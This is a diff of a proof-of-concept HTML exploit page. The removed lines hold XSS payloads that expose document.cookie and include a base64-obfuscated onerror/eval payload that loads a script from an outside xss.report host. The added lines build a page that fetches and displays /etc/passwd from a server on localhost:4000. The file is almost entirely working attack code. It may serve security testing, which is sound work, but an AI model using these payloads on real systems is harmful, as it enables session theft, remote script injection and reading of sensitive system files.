@@ -1,9 +1,25 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <img src="x" onerror=prompt(document.cookie) />
-    <img src="x" onerror=prompt(document.domain) />
+<head>
+  <title>PoC: Read /etc/passwd</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    pre { white-space: pre-wrap; word-break: break-word; }
+  </style>
+</head>
+<body>
+  <h2>📂 /etc/passwd content from localhost</h2>
+  <pre id="output">Loading...</pre>
 
-    <iframe src=http://localhost:4000/etc/passwd></iframe>
-    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2Jvb202NzAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
-  </body>
+  <script>
+    fetch("http://localhost:4000/etc/passwd")
+      .then(r => r.text())
+      .then(text => {
+        document.getElementById("output").textContent = text;
+      })
+      .catch(e => {
+        document.getElementById("output").textContent = "❌ Failed to fetch: " + e;
+      });
+  </script>
+</body>
 </html>
